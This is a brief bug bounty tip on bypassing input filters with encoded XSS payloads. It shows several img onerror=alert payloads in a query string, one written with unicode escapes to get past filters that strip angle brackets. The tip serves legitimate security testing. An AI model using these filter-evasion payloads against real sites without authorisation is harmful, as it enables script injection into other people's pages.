Tip:
Bug Bounty Tip Always check different encodings for your XSS payload. For example: ?q=`<img/src/onerror=alert()>`<img src onerror=alert(1)> ?q=\u003cimg src onerror=alert(1)\u003e There might be a filter that removes <>, but not unicode symbols \u003c \u003e.